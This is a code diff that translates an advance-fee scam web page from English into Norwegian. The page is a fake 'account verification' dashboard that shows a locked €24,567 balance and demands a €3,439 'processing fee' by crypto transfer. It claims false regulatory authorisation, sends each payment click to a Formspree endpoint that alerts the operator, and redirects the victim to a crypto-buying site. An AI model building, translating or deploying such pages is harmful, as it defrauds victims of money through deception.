@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="no">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Verification | Secure Asset Management</title>
+    <title>Kontoverifisering | Sikker Formuesforvaltning</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -145,70 +145,73 @@
 <body>
 
     <header class="header-branding">
-        <img src="https://i.imgur.com/IJ3d8xB.png" alt="Company Logo" class="company-logo">
-        <img src="https://i.imgur.com/8xmt6AQ.png" alt="Regulator Logo" class="regulator-logo-top">
+        <img src="https://i.imgur.com/IJ3d8xB.png" alt="Selskapets logo" class="company-logo">
+        <img src="https://i.imgur.com/8xmt6AQ.png" alt="Regulatorens logo" class="regulator-logo-top">
     </header>
 
     <div class="main-container">
-        <!-- STEP 1: VERIFICATION DETAILS -->
+        <!-- TRINN 1: VERIFISERINGSDETALJER -->
         <div id="step-1" class="dashboard-card">
-            <div class="card-header"><h1>Account Verification Status</h1></div>
+            <div class="card-header"><h1>Status for kontoverifisering</h1></div>
             <div class="card-body">
                 <div class="data-item">
-                    <span class="label">Account Balance</span>
-                    <span class="value balance-value">€24,567</span>
+                    <span class="label">Kontosaldo</span>
+                    <span class="value balance-value">€24 567</span>
                 </div>
                 <div class="data-item">
-                    <span class="label">Pool Named After</span>
+                    <span class="label">Pool navngitt etter</span>
                     <span class="value">John Jonsonuk</span>
                 </div>
                 <div class="data-item">
-                    <span class="label">Verification Status</span>
-                    <span class="status-badge status-completed"><i class="fas fa-check-circle"></i> &nbsp; Completed</span>
+                    <span class="label">Verifiseringsstatus</span>
+                    <span class="status-badge status-completed"><i class="fas fa-check-circle"></i> &nbsp; Fullført</span>
                 </div>
                 <div class="data-item">
-                    <span class="label">Processing Fees (14%)</span>
-                    <span class="value fee-value">€3,439</span>
+                    <span class="label">Behandlingsgebyr (14%)</span>
+                    <span class="value fee-value">€3 439</span>
                 </div>
                 <div class="data-item">
-                    <span class="label">Fees Status</span>
-                    <span class="status-badge status-pending"><i class="fas fa-clock"></i> &nbsp; Pending</span>
+                    <span class="label">Gebyrstatus</span>
+                    <span class="status-badge status-pending"><i class="fas fa-clock"></i> &nbsp; Venter</span>
                 </div>
 
                 <div class="notice-box">
-                    <h2>Important Notice</h2>
-                    <p>Additional documentation or administrative review may be required before account services can be fully processed.</p>
+                    <h2>Viktig melding</h2>
+                    <p>Ytterligere dokumentasjon eller administrativ gjennomgang kan være nødvendig før kontotjenester kan behandles fullstendig.</p>
+                    <p>Administrative gebyrer må gjøres opp for å fullføre prosessen med frigjøring av midler.</p>
                 </div>
 
-                <button class="btn-action" onclick="showStep2()">Continue to Settlement</button>
+                <button class="btn-action" onclick="showStep2()">Fortsett til oppgjør</button>
             </div>
         </div>
 
-        <!-- STEP 2: SETTLEMENT -->
+        <!-- TRINN 2: OPPGJØR -->
         <div id="step-2" class="dashboard-card">
-            <div class="card-header"><h1>Administrative Settlement</h1></div>
+            <div class="card-header"><h1>Administrativt oppgjør</h1></div>
             <div class="card-body">
                 <div style="text-align: center; margin-bottom: 25px;">
-                    <p style="color: var(--text-muted); font-size: 0.9rem;">Total Fee Amount Due:</p>
-                    <h2 style="font-size: 2rem; color: var(--primary-blue);">€3,439.00</h2>
+                    <p style="color: var(--text-muted); font-size: 0.9rem;">Totalt gebyrbeløp som forfaller:</p>
+                    <h2 style="font-size: 2rem; color: var(--primary-blue);">€3 439,00</h2>
                 </div>
 
-                <p style="margin-bottom: 20px; font-size: 0.9rem;">To finalize the release of funds to <strong>John Jonsonuk</strong>, please proceed with the settlement via our authorized secure gateway.</p>
+                <p style="margin-bottom: 20px; font-size: 0.9rem;">For å fullføre frigjøringen av midler til <strong>John Jonsonuk</strong>, vennligst fortsett med oppgjøret via vår autoriserte sikre portal.</p>
                 
                 <div class="notice-box" style="border-left-color: #f39c12;">
-                    <p><strong>Payment Method:</strong> Secure Crypto Transfer</p>
+                    <p><strong>Betalingsmetode:</strong> Sikker kryptooverføring</p>
+                    <p style="font-size: 0.75rem;">Viderekobler til partner: Changelly Global</p>
                 </div>
 
-                <button id="pay-button" class="btn-action" style="background: #2ecc71;" onclick="handlePayment()">PAY FEES & RELEASE FUNDS</button>
-                <button onclick="location.reload()" style="background:none; border:none; color:var(--text-muted); width:100%; margin-top:15px; cursor:pointer; font-size:0.8rem;">Back to Overview</button>
+                <button id="pay-button" class="btn-action" style="background: #2ecc71;" onclick="handlePayment()">BETAL GEBYR OG FRIGJØR MIDLER</button>
+                <button onclick="location.reload()" style="background:none; border:none; color:var(--text-muted); width:100%; margin-top:15px; cursor:pointer; font-size:0.8rem;">Tilbake til oversikt</button>
             </div>
         </div>
     </div>
 
     <footer class="footer">
         <p class="compliance-text">
-            Authorized and regulated by the Financial Conduct Authority. 
-            Verification ID: 8842-X99-JONSONUK
+            Autorisert og regulert av relevante internasjonale tilsynsmyndigheter. 
+            Alle transaksjoner er underlagt AML/KYC-verifisering.
+            <br>Verifiserings-ID: 8842-X99-JONSONUK
         </p>
     </footer>
 
@@ -221,16 +224,15 @@
         async function handlePayment() {
             const btn = document.getElementById('pay-button');
             btn.disabled = true;
-            btn.innerText = "Processing...";
+            btn.innerText = "Behandler...";
 
             const formData = new FormData();
-            formData.append('Action', 'Fee Payment Initiated');
-            formData.append('Client', 'John Jonsonuk');
-            formData.append('Amount', '€3,439');
-            formData.append('Timestamp', new Date().toLocaleString());
+            formData.append('Action', 'Betaling initiert');
+            formData.append('Kunde', 'John Jonsonuk');
+            formData.append('Beløp', '€3 439');
+            formData.append('Tidspunkt', new Date().toLocaleString('nb-NO'));
 
             try {
-                // Send notification to Formspree
                 await fetch('https://formspree.io/f/mqeovrgq', {
                     method: 'POST',
                     body: formData,
@@ -239,9 +241,8 @@
                     }
                 });
             } catch (error) {
-                console.error('Notification error:', error);
+                console.error('Varslingsfeil:', error);
             } finally {
-                // Redirect regardless of notification success to ensure conversion
                 window.location.href = "https://changelly.com/buy-crypto";
             }
         }
